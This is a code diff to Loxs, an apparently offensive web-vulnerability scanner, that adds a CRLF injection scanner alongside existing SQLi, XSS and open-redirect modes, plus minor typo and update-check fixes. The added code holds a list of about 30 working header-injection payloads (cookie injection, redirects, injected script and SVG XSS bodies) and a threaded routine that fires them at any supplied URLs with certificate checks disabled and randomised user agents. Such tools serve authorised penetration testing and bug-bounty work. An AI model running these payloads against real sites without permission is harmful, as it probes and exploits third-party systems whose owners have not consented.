@@ -115,8 +115,9 @@ try:
             "2] OR Scanner",
             "3] SQLi Scanner",
             "4] XSS Scanner",
-            "5] tool Update",
-            "6] Exit"
+            "5] CRLF Scanner",
+            "6] tool Update",
+            "7] Exit"
         ]
         
         for option in options:
@@ -702,7 +703,7 @@ try:
                             print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                             input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                             clear_screen()
-                            print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq- HexSh1dow - AnonKryptiQuz - Naho\n")
+                            print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho\n")
                 except Exception as e:
                     print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                     input(f"{Fore.YELLOW}[i] Press Enter to try again...")
@@ -1167,20 +1168,14 @@ try:
 
         def get_chrome_driver():
             options = Options()
-            options = webdriver.ChromeOptions()
             options.add_argument("--headless")
             options.add_argument("--disable-dev-shm-usage")
             options.add_argument("--disable-extensions")
             options.add_argument("--window-size=1920,1080")
-            options.add_argument('--no-sandbox')
-            options.binary_location = '/usr/bin/google-chrome'
-            options.add_argument('--disable-gpu')
-            options.add_argument('--remote-debugging-port=9222')
-            options.add_argument('--disable-software-rasterizer')
-            
             from selenium.webdriver.chrome.service import Service
 
-            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+            service = Service(ChromeDriverManager().install())
+            driver = webdriver.Chrome(service=service, options=options)
             driver.set_page_load_timeout(10)
             return driver
 
@@ -1640,8 +1635,268 @@ try:
         print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
 
         os._exit(0)
+        
+    def run_crlf_scanner(scan_state=None):
+        import re
+        import urllib.parse
+        import requests
+        import urllib3
+        from requests.adapters import HTTPAdapter
+        from urllib3.util.retry import Retry
+        from prompt_toolkit import prompt
+        from prompt_toolkit.completion import PathCompleter
+        init(autoreset=True)
 
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        PAYLOADS = [
+            "/%%0a0aSet-Cookie:loxs=injected",
+            "/%0aSet-Cookie:loxs=injected;",
+            "/%0aSet-Cookie:loxs=injected",
+            "/%0d%0aLocation: http://loxs.pages.dev",
+            "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
+            "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+            "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
+            "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
+            "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
+            "/%0d%0aLocation: loxs.pages.dev",
+            "/%0d%0aSet-Cookie:loxs=injected;",
+            "/%0aSet-Cookie:loxs=injected",
+            "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
+            "/%23%0aSet-Cookie:loxs=injected",
+            "/%25%30%61Set-Cookie:loxs=injected",
+            "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+            "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
+            "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+            "/%5Cr%20Set-Cookie:loxs=injected;",
+            "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
+            "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
+            "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
+            "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
+            "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
+            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
+            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+            "/%u000ASet-Cookie:loxs=injected;",
+            "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
+            "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+        ]
+
+        REGEX_PATTERNS = [
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
+        ]
+
+        def get_random_user_agent():
+            return random.choice(USER_AGENTS)
+
+        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
+            session = requests.Session()
+            retry = Retry(
+                total=retries,
+                read=retries,
+                connect=retries,
+                backoff_factor=backoff_factor,
+                status_forcelist=status_forcelist,
+            )
+            adapter = HTTPAdapter(max_retries=retry)
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            return session
+
+        def check_crlf_vulnerability(url, payload):
+            target_url = f"{url}{payload}"
+            start_time = time.time()
+            
+            headers = {
+                'User-Agent': get_random_user_agent(),
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close'
+            }
+
+            try:
+                session = get_retry_session()
+                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
+                response_time = time.time() - start_time
+
+                is_vulnerable = False
+                vulnerability_details = []
+
+                for header, value in response.headers.items():
+                    if any(re.search(pattern, f"{header}: {value}", re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                        is_vulnerable = True
+                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{header}: {value}")
+
+                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                    is_vulnerable = True
+                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")
+
+                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
+                    if is_vulnerable:
+                        result = Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+                        if vulnerability_details:
+                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
+                    else:
+                        result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+                else:
+                    result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
+
+                if scan_state:
+                    scan_state['total_scanned'] += 1
+                    if is_vulnerable:
+                        scan_state['vulnerability_found'] = True
+                        scan_state['vulnerable_urls'].append(target_url)
+                        scan_state['total_found'] += 1
+
+                return result, is_vulnerable
+
+            except requests.exceptions.RequestException as e:
+                print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
+                return None, False
+
+        def test_crlf(url, max_threads=5):
+            found_vulnerabilities = 0
+            vulnerable_urls = []
+
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in PAYLOADS}
+                for future in as_completed(future_to_payload):
+                    payload = future_to_payload[future]
+                    try:
+                        result, is_vulnerable = future.result()
+                        if result:
+                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
+                            print(result)
+                            if is_vulnerable:
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(url + payload)
+                    except Exception as e:
+                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
+            return found_vulnerabilities, vulnerable_urls
+
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+            border = "┌" + "─" * (max_length + 2) + "┐"
+            bottom_border = "└" + "─" * (max_length + 2) + "┘"
+            
+            print(Fore.YELLOW + f"\n{border}")
+            for line in summary:
+                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                padding = max_length - len(padded_line)
+                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+            print(Fore.YELLOW + bottom_border)
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
+            if generate_report == 'y':
+                html_content = generate_html_report("Carriage Return Line Feed Injection (CRLF)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
+                report_file = save_html_report(html_content, filename)
+
+        def get_file_path(prompt_text):
+            return prompt(prompt_text, completer=PathCompleter())
+
+        def prompt_for_urls():
+            while True:
+                try:
+                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            raise FileNotFoundError(f"File not found: {url_input}")
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        else:
+                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
+                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
+                            clear_screen()
+                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
+                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
+                    clear_screen()
+                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
+        try:
+
+            clear_screen()
+            panel = Panel(
+            r"""
+     __________  __    ______
+    / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
+   / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+  / /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
+  \____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/
+
+            """,
+            style="bold green",
+            border_style="blue",
+            expand=False
+            )
+            rich_print(panel, "\n")
+
+            print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")
+
+            urls = prompt_for_urls()
+            
+            max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
+            max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5
+
+            print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+            time.sleep(1)
+            clear_screen()
+            print(Fore.CYAN + "[i] Starting scan...\n")
+
+            total_found = 0
+            total_scanned = 0
+            start_time = time.time()
+            vulnerable_urls = []
+
+            if scan_state is None:
+                scan_state = {
+                    'vulnerability_found': False,
+                    'vulnerable_urls': [],
+                    'total_found': 0,
+                    'total_scanned': 0
+                }
+
+            for url in urls:
+                box_content = f" → Scanning URL: {url} "
+                box_width = max(len(box_content) + 2, 40)
+                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+
+                found, urls_with_payloads = test_crlf(url, max_threads)
+                total_found += found
+                total_scanned += len(PAYLOADS)
+                vulnerable_urls.extend(urls_with_payloads)
+
+            print_scan_summary(total_found, total_scanned, start_time)
+            save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+        except KeyboardInterrupt:
+            print(Fore.RED + "\n[!] Program interrupted by user.")
+            print_scan_summary(total_found, total_scanned, start_time)
+            sys.exit(0)
+
+        
     def run_update():
+        from packaging import version
+        import requests
+        from rich.console import Console
+        from rich.panel import Panel
+        from rich.progress import Progress
         
         console = Console()
         def display_update_intro():
@@ -1662,7 +1917,7 @@ try:
                 style="bold green",
             )
             console.print(panel)
-            console.print("[cyan] Wlcome to the loxs updater![/cyan]\n")
+            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")
 
         def get_latest_release(repo_owner, repo_name):
             url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
@@ -1703,6 +1958,16 @@ try:
                 console.print(f"[red][!] Error downloading update: {e}[/red]")
                 return False
 
+        def normalize_version(v):
+            # Remove 'v' prefix if present
+            # v = v.lstrip('v')
+
+            # Three components (major.minor.patch)
+            parts = v.split('.')
+            while len(parts) < 3:
+                parts.append('0')
+            return '.'.join(parts)
+
         display_update_intro()
 
         repo_owner = "coffinxp"
@@ -1724,7 +1989,10 @@ try:
             input("\nPress Enter to return to the main menu...")
             return
 
-        if version.parse(latest_version) > version.parse(current_version):
+        current_v = version.parse(normalize_version(current_version))
+        latest_v = version.parse(normalize_version(latest_version))
+
+        if latest_v > current_v:
             console.print(f"[green][✓] New version available: {latest_version}[/green]")
             update_choice = console.input("[cyan][?] Do you want to update? (y/n): [/cyan]").lower().strip()
             
@@ -1741,7 +2009,7 @@ try:
             else:
                 console.print("[yellow][i] Update cancelled.[/yellow]")
         else:
-            console.print("[green][✓] You are already using the latst version.[/green]")
+            console.print("[green][✓] You are already using the latest version.[/green]")
             console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
             console.print(f"[cyan][i] Latest version: {latest_version}[/cyan]")
 
@@ -1767,10 +2035,14 @@ try:
 
         elif selection == '5':
             clear_screen()
+            run_crlf_scanner()
+
+        elif selection == '6':
+            clear_screen()
             run_update()
             clear_screen()
 
-        elif selection == '6':
+        elif selection == '7':
             clear_screen()
             print_exit_menu()
 
@@ -1786,7 +2058,7 @@ try:
         while True:
             try:
                 display_menu()
-                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-6): {Style.RESET_ALL}").strip()
+                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-7): {Style.RESET_ALL}").strip()
                 handle_selection(choice)
             except KeyboardInterrupt:
                 print_exit_menu()
